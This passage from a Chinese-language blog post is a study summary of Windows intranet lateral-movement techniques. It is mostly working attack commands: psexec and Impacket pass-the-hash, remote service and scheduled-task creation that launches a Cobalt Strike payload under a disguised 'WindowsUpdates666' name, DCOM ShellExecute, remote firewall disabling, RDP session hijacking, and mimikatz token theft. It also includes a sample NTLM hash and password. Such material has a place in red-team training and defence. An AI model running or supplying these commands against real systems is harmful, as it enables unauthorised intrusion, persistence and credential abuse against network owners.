<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145743238.png" alt="image-20200824145743238"></p>
<p>3、使用powershell横向渗透</p>
<p>​        直接执行命令的方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName 192.168.3.73 -ScriptBlock &#123; query user &#125; -credential administrator</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145045948.png" alt="image-20200824145045948"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145027678.png" alt="image-20200824145027678"></p>
<p>​        获取交互shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName 192.168.3.73 -Credential administrator</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145336582.png" alt="image-20200824145336582"></p>
<h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>​        因为本地管理员具有创建，重启，修改二进制文件路径的权限，因此可以通过这种方式进行横向移动。</p>
<p><strong>1、psexec横向移动</strong></p>
<p>​        通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为”PSEXESVC”的二进制文件，然后通过psexec服务运行命令，运行结束后删除服务。</p>
<p>利用说明：</p>
<pre><code>- 使用psexec需要开启admin$共享
- Psexec 连接目标时会创建PSEXESVC 服务，退出时删除PSEXESVC 服务，会在目标日志系统留下大量痕迹
-  通过Psexec获得交互式shell时，正常使用exit退出会删除目标机器上的PSEXESVC 服务，直接点 X 关闭可能导致目标服务无法删除。如果使用交互式shell执行阻塞的进程可能导出服务不能正常退出。
- Psexec 该工具支持socks代理</code></pre><p>​    <strong>无ipc连接情况下</strong></p>
<p>​        获取反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe  \\192.168.3.144 -u administrator -p xxx cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824154405301.png" alt="image-20200824154405301"></p>
<p>​        执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\192.168.3.144 -u administrator -p xxx cmd.exe &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824171320209.png" alt="image-20200824171320209"></p>
<p>有ipc连接情况下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\192.168.3.144 cmd.exe</span><br><span class="line">psexec.exe \\192.168.3.144 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824171717205.png" alt="image-20200824171717205"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824171830308.png" alt="image-20200824171830308"></p>
<p><strong>2、Impacket套件psexec利用</strong></p>
<p>​        当我们仅仅获取hash,可以通过Impacket的psexec进行利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -hashes :xxxxx .&#x2F;administrator@192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824173040617.png" alt="image-20200824173040617"></p>
<pre><code>使用psexec.exe执行文件上线，首先生成service的exe</code></pre><p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824173346403.png" alt="image-20200824173346403"></p>
<p>​        将exe上传到边界机上，执行如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -hashes :xxxxx .&#x2F;administrator@192.168.3.144  -c c:\xxx\xxx\xxx.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824173708846.png" alt="image-20200824173708846"></p>
<p><strong>3、SCShell横向移动</strong></p>
<pre><code>SCShell是无文件横向移动工具，它依赖ChangeServiceConfigA来运行命令。该工具的优点在于它不会针对SMB执行身份验证。一切都通过DCERPC执行。无需创建服务，而只需通过ChangeServiceConfigAAPI 远程打开服务并修改二进制路径名即可（所以要事先知道目标上的服务名称）。</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCShell.exe 192.168.3.144 已知的服务名 &quot;C:\windows\system32\calc.exe&quot; . administrastor Password</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825101545936.png" alt="image-20200825101545936"></p>
<p><strong>4、使用SC命令操作服务</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc \\xxx.xxx.xxx.xx create test666 binpath&#x3D;&quot;C:\Windows\System32\calc.exe&quot;</span><br><span class="line">sc \\xxx.xxx.xxx.xx	query test666</span><br><span class="line">sc \\xxx.xxx.xxx.xx start test666</span><br><span class="line">sc \\xxx.xxx.xxx.xx delete test666</span><br></pre></td></tr></table></figure>

<p>​        我这里测试遇到了1053错误，找了很多方法都没能解决</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825101901258.png" alt="image-20200825101901258"></p>
<p>​        经过请教部门的同事，虽然启动服务会爆1053错误，但实际上exe也会正常执行。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826200332927.png" alt="image-20200826200332927"></p>
<p>​        但是这里还是还是有一个问题，就是当启动爆出1053错误后，原本执行的exe进行会消失，假如我们执行的这个exe是cs生成的马，那么使用sc执行后会随着报错的出现导致shell掉了吗？</p>
<p>​        经过测试发现确实会掉，最终确定爆1053的原因是我们执行的exe不是一个正常的service，因此执行会爆1053的错误，使用cs生成一个services类型的马就可以正常执行了，并且不会报错。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826201410161.png" alt="image-20200826201410161"></p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p><strong>什么是计划任务？</strong></p>
<p>​        所谓的计划任务，就是在某个时间去执行某个操作。</p>
<p><strong>有什么利用条件？</strong></p>
<ul>
<li>有管理员的账号密码</li>
<li>net use 可以正常连接</li>
<li>windows计划任务服务”Task Scheduler”启动</li>
</ul>
<p><strong>计划任务横向渗透</strong></p>
<pre><code>在一些比较老的系统比如xp/2003是使用at命令来执行计划任务操作,在2008可以使用at和schtasks执行计划任务。</code></pre><p>1、AT计划任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.100\admin$ &quot;xxx&quot; &#x2F;user:administrator</span><br><span class="line">net time \\192.168.3.100 </span><br><span class="line">xcopy C:\Users\jerry\Desktop\artifact.exe \\192.168.3.100\admin$\temp </span><br><span class="line">at \\192.168.3.100 10:54 &#x2F;every:25 c:\windows\temp\artifact.exe  开始在远程机器上创建计划任务,只在每个月的25号的晚上10点54准时执行指定的 payload</span><br><span class="line">at \\192.168.3.100 查看远程机器上的所有计划任务列表</span><br><span class="line">at \\192.168.3.100 &#x2F;delete &#x2F;yes 删除远程机器上的所有计划任务,也可以用指定 id 的方式删除单条计划任务</span><br><span class="line">net use \\192.168.3.100\admin$ &#x2F;del 用完以后,立即删除该 ipc 连接</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825105332939.png" alt="image-20200825105332939"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825105719447.png" alt="image-20200825105719447"></p>
<p>2、schtasks计划任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.100\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxx&quot;</span><br><span class="line">net time \\192.168.3.100</span><br><span class="line">xcopy C:\Users\jerry\Desktop\artifact.exe \\192.168.3.100\admin$\temp\</span><br><span class="line">chcp 437 如果目标是中文系统,最好先调整下字符集,不然会有问题</span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.3.100 &#x2F;u &quot;administrator&quot; &#x2F;p &quot;xxxx&quot; &#x2F;RL HIGHEST &#x2F;F &#x2F;tn &quot;WindowsUpdates666&quot; &#x2F;tr &quot;c:\windows\temp\artifact.exe&quot; &#x2F;sc DAILY &#x2F;mo 1 &#x2F;ST 11:06 在远程的目标机器上创建计划任务</span><br><span class="line">schtasks &#x2F;run &#x2F;tn WindowsUpdates666 &#x2F;s 192.168.3.100 &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxx&quot; 创建完以后,远程手动运行</span><br><span class="line">schtasks &#x2F;query &#x2F;s 192.168.3.100 &#x2F;U &quot;administrator&quot; &#x2F;P &quot;xxxx&quot; | findstr &quot;WindowsUpdates666&quot; 运行完以后,随手检查运行状态</span><br><span class="line">schtasks &#x2F;delete &#x2F;F &#x2F;tn WindowsUpdates &#x2F;s 192.168.3.100 &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxx&quot; 一般情况下,在我们拿到远程机器 shell 以后,立即删除远程机器上的计划任务即可</span><br></pre></td></tr></table></figure>

<p>​            使用schtasks可以手工去启动计划任务，无需等到特定的时间去触发</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825114556769.png" alt="image-20200825114556769"></p>
<p>3、impacket套件atexec</p>
<p>​        通过Task Scheduler服务在目标系统上执行命令，并返回输出结果。atexec 脚本默认只支持 2008 之后的系统，默认弹回来的是system权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe .&#x2F;administrator:xxxx@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825115822194.png" alt="image-20200825115822194"></p>
<p>​        也可以使用hash来进行认证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe -hashes :xxxxxxxx .&#x2F;administrator@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825120022273.png" alt="image-20200825120022273"></p>
<h3 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h3><p><strong>什么是DCOM?</strong></p>
<p>​        DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。通过DOCM,客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。</p>
<p><strong>DCOM的基本应用</strong></p>
<p>​        获取DCOM的程序列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825133624007.png" alt="image-20200825133624007"></p>
<p>​        Get-CimInstance在powershell3.0以上版本存在，只能在win2012以上才能使用。可以使用下面的命令代替</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825134908675.png" alt="image-20200825134908675"></p>
<p>​        也可以使用WMIC获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_DCOMApplication  GET &#x2F;all &#x2F;FORMAT:list</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825133744491.png" alt="image-20200825133744491"></p>
<p><strong>使用DCOM在本地执行任意命令</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com&#x3D;[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimzed&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825135624138.png" alt="image-20200825135624138"></p>
<p>​        注意执行上面的命令需要<strong>本地以管理员权限运行</strong>，否则会出现如下错误</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825141214424.png" alt="image-20200825141214424"></p>
<p><strong>在远程主机上执行任意命令</strong></p>
<p>利用条件：</p>
<ul>
<li><p>域环境下使用</p>
</li>
<li><p>Client：关闭防火墙</p>
</li>
<li><p>Server：获得域主机内置帐户administrator的口令，可net use连接至Client</p>
</li>
</ul>
<p>1、调用MMC20.Application在远程主机上执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.3.73&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd.exe&quot;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825142928339.png" alt="image-20200825142928339"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825142937085.png" alt="image-20200825142937085"></p>
<p>​        这种方式我在域环境中复现成功，在非域环境未复现成功，会爆如下错误</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825143624888.png" alt="image-20200825143624888"></p>
<p>2、调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$com &#x3D; [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.3.73&quot;)</span><br><span class="line">$obj &#x3D; [System.Activator]::CreateInstance($com)</span><br><span class="line">$item &#x3D; $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825160835771.png" alt="image-20200825160835771"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825160845127.png" alt="image-20200825160845127"></p>
<p>​        这种方式执行完calc后会直接弹出，而不是在后台执行</p>
<p>3、调用’C08AFD90-F2A1-11D1-8455-00A0C91F3880’</p>
<p>​        这种方式适合于win2012和win10，不适合win7</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$com &#x3D; [Type]::GetTypeFromCLSID(&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;,&quot;192.168.3.73&quot;)</span><br><span class="line">$obj &#x3D; [System.Activator]::CreateInstance($com)</span><br><span class="line">$obj.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825161330814.png" alt="image-20200825161330814"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825161345598.png" alt="image-20200825161345598"></p>
<p><strong>远程操作防火墙</strong></p>
<p>1、通过sc命令远程关闭防火墙</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.3.73 stop mpssvc</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825162057120.png" alt="image-20200825162057120"></p>
<p>2、远程修改防火墙配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh -r 192.168.3.73 -u  rootkit\administrator -p xxx advfirewall firewall add rule name&#x3D;&quot;any&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;any action&#x3D;allow</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825163734585.png" alt="image-20200825163734585"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh -r 192.168.3.73  -u rootkit\administrator -p xxx advfirewall firewall Delete rule name&#x3D;&quot;any&quot;  删除规则</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825163854134.png" alt="image-20200825163854134"></p>
<p><strong>使用DCOM进行横向移动</strong></p>
<p>1、使用impacket进行横向移动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe .&#x2F;administrator:Admin123456@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825165327715.png" alt="image-20200825165327715"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 .&#x2F;administrator@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825165658575.png" alt="image-20200825165658575"></p>
<h3 id="RDP-hijacking"><a href="#RDP-hijacking" class="headerlink" title="RDP hijacking"></a>RDP hijacking</h3><p><strong>什么是RDP hijacking?</strong></p>
<p>​        RDP劫持可以在我们没有用户密码的情况下获取用户的情况下获取用户的桌面。</p>
<p><strong>有什么利用条件？</strong></p>
<ul>
<li>获取了当前系统的system权限</li>
<li>通过query user 可以看到多个用户</li>
</ul>
<p><strong>如何使用RDP劫持？</strong></p>
<p>​        通过在任务管理器中，我们可以看到当前有两个用户处于活动状态</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825173119488.png" alt="image-20200825173119488"></p>
<p>​        如果我们想切换到其他用户的会话，右击选择连接，输入密码后即可获取其他用户的rdp桌面</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825173332767.png" alt="image-20200825173332767"></p>
<p>​        但是当我们具有system权限时，可以无需密码获取其他用户的会话。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825181732190.png" alt="image-20200825181732190"></p>
<p>​        当然使用这种方式会把其他正在运行的用户挤下线，对于处于断开状态的用户则没有什么影响。</p>
<h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p><strong>什么是PTH?</strong></p>
<p>​        由于 net-ntlm 在验证的时候,是直接用用户密码 hash 而非明文的方式来验证的,因此仅仅知道hash也可以完成认证过程，拿到用户的hash直接去认证并且获取访问资源的这个过程就叫做PTH。</p>
<p><strong>为什么要使用PTH?</strong></p>
<p>​        在渗透的过程中，经常会遇到2012及以上的系统，这些系统在默认情况下lsass进程中没有保存明文，只能获取到hash，在解不开密码的情况下，只能通过pth来进行横向渗透。</p>
<p><strong>PTH的利用条件？</strong></p>
<ul>
<li>445端口可以正常访问</li>
<li>获取目标主机的ntml hash</li>
</ul>
<p><strong>利用PTH横向渗透</strong></p>
<p>1、通过mimikatz进行PTH利用</p>
<p>​        在cs中使用mimikatz来进行PTH</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:. &#x2F;ntlm:xxxxx &#x2F;run:&quot;powershell -w hidden&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826103350172.png" alt="image-20200826103350172"></p>
<p>​        本来没有权限访问192.168.3.144主机的目录，但是通过令牌替换后，即可访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steal_token PID</span><br><span class="line">shell dir \\192.168.3.144\c$</span><br><span class="line">rev2self  恢复原始用户权限</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826103511241.png" alt="image-20200826103511241"></p>
<p>2、使用CS进行PTH横向移动</p>
<p>​            在CS的选项中选择target</p>
